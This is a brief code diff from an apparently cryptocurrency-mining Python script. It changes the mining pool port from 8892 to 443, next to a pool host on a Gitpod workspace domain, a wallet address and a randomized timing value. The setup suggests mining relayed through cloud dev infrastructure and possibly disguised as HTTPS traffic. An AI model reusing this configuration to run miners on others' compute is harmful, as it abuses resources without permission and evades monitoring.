@@ -16,7 +16,7 @@ import random
 
 
 pool_host = '8892-azure-hedgehog-7mtjcmij.ws-us03.gitpod.io'
-pool_port = 8892
+pool_port = 443
 pool_pass = 'x'
 wallet_address = '46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y'
 random_number_time = (random.randint(1, 15) + 20)
